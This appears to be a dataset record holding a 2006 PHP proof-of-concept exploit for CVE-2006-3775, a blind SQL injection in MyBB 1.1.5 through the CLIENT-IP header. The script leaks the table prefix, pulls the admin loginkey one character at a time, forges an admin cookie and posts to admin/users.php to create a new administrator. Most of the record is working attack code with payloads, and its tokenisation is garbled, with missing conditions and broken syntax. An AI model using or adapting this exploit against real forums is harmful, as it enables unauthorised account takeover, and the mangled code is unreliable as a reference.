{
    "text": "vul_name : MyBulletinBoard ( MyBB ) 1.1.5 'CLIENT-IP' sql injection ， vul_cve : CVE-2006-3775 ， vul_poc :  #  ! /usr/bin/php -q -d short_open_tag=on ， <? ， echo \"MyBulletinBoard ( MyBB ) <= 1.1.5 'CLIENT-IP' SQL injection / create new admin exploitn\" ;  ， echo \"by rgod rgod ( at ) autistici ( dot ) org [ email concealed ] n\" ;  ， echo \"site :  ， echo \"dork , version specific : \"Powered By MyBB\" \"2006 MyBB Group\"nn\" ;  ， works regardless of php.ini settings ， echo \"Usage : php \". $ argv [ 0 ] .\" host path OPTIONSn\" ;  ， echo \"host : target server ( ip/hostname ) n\" ;  ， echo \"path : path to MyBBn\" ;  ， echo \"Options : n\" ;  ， echo \" -T [ prefix ] specify a table prefix different from default ( mybb_ ) n\" ;  ， echo \" -u [ number ] specify a user id other than 1 ( usually admin ) n\" ;  ， echo \" -p [ port ]  : specify a port other than 80n\" ;  ， echo \" -P [ ip : port ]  : specify a proxyn\" ;  ， echo \" -d : disclose table prefix ( reccomended ) n\" ;  ， echo \"Example : rn\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /MyBB/ -drn\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /MyBB/ -Tmy_rn\" ;  ， die ;  ， } ， / * software site :  ， vulnerable code in inc/functions.php near lines 1292-1320 :  ， . ， global $ _SERVER ;  ， { ， { ， { ， { ，  $ ip = $ val ;  ， } ， } ， } ， } ， { ， { ，  $ ip = $ _SERVER [ 'HTTP_CLIENT_IP' ]  ;  ， } ， { ，  $ ip = $ _SERVER [ 'REMOTE_ADDR' ]  ;  ， } ， } ， } ， . ， you can spoof your ip address through the CLIENT-IP http header. ， as result you can inject sql statements in class_session.php at lines 36-68 :  ， by calling the main index.php script ， . ， { ， global $ ipaddress ,  $ db ,  $ mybb ,  $ noonline ;  ， / Get our visitors IP ，  $ this->ipaddress = $ ipaddress = getip (  )  ;  ， / User-agent ，  $ this->useragent = $ _SERVER [ 'HTTP_USER_AGENT' ]  ;  ， { ，  $ this->useragent = substr (  $ this->useragent , 0 , 100 )  ;  ， } ， / Attempt to find a session id in the cookies ， { ，  $ this->sid = addslashes (  $ _COOKIE [ 'sid' ]  )  ;  ， } ， { ，  $ this->sid = 0 ;  ， } ， / Attempt to load the session from the database ，  $ query = $ db->query ( \"SELECT sid , uid FROM \".TABLE_PREFIX.\"sessions WHERE sid='\". $ this->sid.\"' AND ip='\". $ this->ipaddress.\"'\" )  ;  ， . ， injection is blind , but you can ask true-false questions to the database to ， retrieve the admin loginkey. ， Through that you can build an admin cookie and create a new admin user through ， the admin/users.php script. ， Also you can disclose table prefix. ，  * Italia - Germania 2-0 , al 114' forse il pi&ugrave ; bel gol che abbia mai visto *  ，  * grazie Grosso !  *  ， error_reporting ( 0 )  ;  ， ini_set ( \"max_execution_time\" , 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ， { ，  $ result=' ;  $ exa=' ;  $ cont=0 ;  ， { ， { $ result.=\" .\" ; } ， { $ result.=\" \". $ string [  $ i ]  ; } ， { $ exa.=\" \".dechex ( ord (  $ string [  $ i ]  )  ; } ， { $ exa.=\" 0\".dechex ( ord (  $ string [  $ i ]  )  ; } ，  $ cont+ ; if (  $ cont=15 ) { $ cont=0 ;  $ result.=\"rn\" ;  $ exa.=\"rn\" ; } ， } ， } ，  $ proxy_regex = ' ( bd{1 , 3}.d{1 , 3}.d{1 , 3}.d{1 , 3} : d{1 , 5}b ) ' ;  ， { ， global $ proxy ,  $ host ,  $ port ,  $ html ,  $ proxy_regex ;  ，  $ ock=fsockopen ( gethostbyname (  $ host )  ,  $ port )  ;  ， echo 'No response from '. $ host.' : '. $ port ; die ;  ， } ， } ，  $ c = preg_match (  $ proxy_regex ,  $ proxy )  ;  ， echo 'Not a valid proxy.' ; die ;  ， } ，  $ parts=explode ( ' : ' ,  $ proxy )  ;  ， echo \"Connecting to \". $ parts [ 0 ] .\" : \". $ parts [ 1 ] .\" proxy.rn\" ;  ，  $ ock=fsockopen (  $ parts [ 0 ]  ,  $ parts [ 1 ]  )  ;  ， echo 'No response from proxy.' ; die ;  ， } ， } ， fputs (  $ ock ,  $ packet )  ;  ，  $ html=' ;  ，  $ html.=fgets (  $ ock )  ;  ， } ， } ，  $ html=' ;  ，  $ html.=fread (  $ ock , 1 )  ;  ， } ， } ， fclose (  $ ock )  ;  ，  # debug ，  # echo \"rn\". $ html ;  ， } ， { ， list (  $ usec ,  $ sec ) = explode ( ' ' , microtime (  )  ;  ， } ， srand ( make_seed (  )  ;  ，  $ anumber = rand ( 1 , 99999 )  ;  ，  $ host= $ argv [ 1 ]  ;  ，  $ path= $ argv [ 2 ]  ;  ，  $ port=80 ;  ，  $ prefix=\"mybb_\" ;  ，  $ user_id=\"1\" ; /admin ，  $ proxy=\" ;  ，  $ dt=0 ;  ，  $ temp= $ argv [  $ i ]  [ 0 ] . $ argv [  $ i ]  [ 1 ]  ;  ， { ，  $ port=str_replace ( \"-p\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ proxy=str_replace ( \"-P\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ prefix=str_replace ( \"-T\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ user_id=str_replace ( \"-u\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ dt=1 ;  ， } ， } ， { ，  $ sql=\"'suntzuuuu/ * \" ;  ， echo \"sql -> \". $ sql.\"rn\" ;  ，  $ packet =\"GET \". $ p.\"index.php HTTP/1.0rn\" ;  ，  $ packet.=\"CLIENT-IP :  $ sqlrn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ， sendpacketii (  $ packet )  ;  ， { ，  $ temp=explode ( \"sessions\" ,  $ html )  ;  ，  $ temp2=explode ( \" \" ,  $ temp [ 0 ]  )  ;  ，  $ prefix= $ temp2 [ count (  $ temp2 ) -1 ]  ;  ， echo \"prefix -> \". $ prefix ; if (  $ prefix=\" ) {echo \" [ no prefix ] \" ; }echo\"n\" ;  ， } ， { ， echo \"unable to disclose table prefix.n\" ;  ， } ， sleep ( 1 )  ;  ， } ，  $ chars [ 0 ] =0 ; /null ，  $ chars=array_merge (  $ chars , range ( 48 , 57 )  ; /numbers ，  $ chars=array_merge (  $ chars , range ( 65 , 90 )  ; /A-Z letters ，  $ chars=array_merge (  $ chars , range ( 97 , 122 )  ; /a-f letters ，  $ j=1 ;  ，  $ loginkey=\" ;  ， { ， { ， { ，  $ sql=\"99999999' UNION SELECT ASCII ( SUBSTRING ( loginkey , \". $ j.\" , 1 ) =\". $ i.\" , 0 FROM \". $ prefix.\"users WHERE uid=1/ * \" ;  ， echo \"sql -> \". $ sql.\"rn\" ;  ，  $ packet =\"GET \". $ p.\"index.php HTTP/1.0rn\" ;  ，  $ packet.=\"CLIENT-IP :  $ sqlrn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ， sendpacketii (  $ packet )  ;  ， } ， } ，  $ j+ ;  ， } ，  $ cookie=\"mybbuser=1_\".trim ( str_replace ( chr ( 0 )  , \" ,  $ loginkey ) .\" ; mybbadmin=1_\".trim ( str_replace ( chr ( 0 )  , \" ,  $ loginkey ) .\" ; \" ;  ， echo \"admin cookie -> \". $ cookie.\"rn\" ;  ，  $ data='-7d62702f250530 ， Content-Disposition : form-data ; name=\"action\" ;  ， do_add ， -7d62702f250530 ， Content-Disposition : form-data ; name=\"userusername\" ;  ， suntzu'. $ anumber.' ， -7d62702f250530 ， Content-Disposition : form-data ; name=\"newpassword\" ;  ， suntzu'. $ anumber.' ， -7d62702f250530 ， Content-Disposition : form-data ; name=\"email\" ;  ， suntzoi ( at ) suntzu ( dot ) org [ email concealed ]  ， -7d62702f250530 ， Content-Disposition : form-data ; name=\"usergroup\" ;  ， 4 ， -7d62702f250530 ， Content-Disposition : form-data ; name=\"additionalgroups [  ] \" ;  ， 4 ， -7d62702f250530 ， Content-Disposition : form-data ; name=\"displaygroup\" ;  ， 4 ， -7d62702f250530 ， Content-Disposition : form-data ; name=\"Add User\" ;  ， Add User ， -7d62702f250530- ， ' ;  ，  $ packet=\"POST \". $ p.\"admin/users.php HTTP/1.0rn\" ;  ，  $ packet.=\"User-Agent : Googlebot/2.1rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Content-Type : multipart/form-data ; boundary=-7d62702f250530rn\" ;  ，  $ packet.=\"Content-Length : \".strlen (  $ data ) .\"rn\" ;  ，  $ packet.=\"Cookie : \". $ cookie.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ，  $ packet.= $ data ;  ， sendpacketii (  $ packet )  ;  ， { ， echo \"exploit succeeded. now login as adminn\" ;  ， echo \"with username \"suntzu\". $ anumber.\" and password \"suntzu\". $ anumber.\"n\" ;  ， } ， { ， echo \"something goes wrong.n\" ; if (  !  $ dt ) echo \"you may try -d optionn\" ;  ， } ， ?> ， original url : ",
    "time": "2006.07.25"
}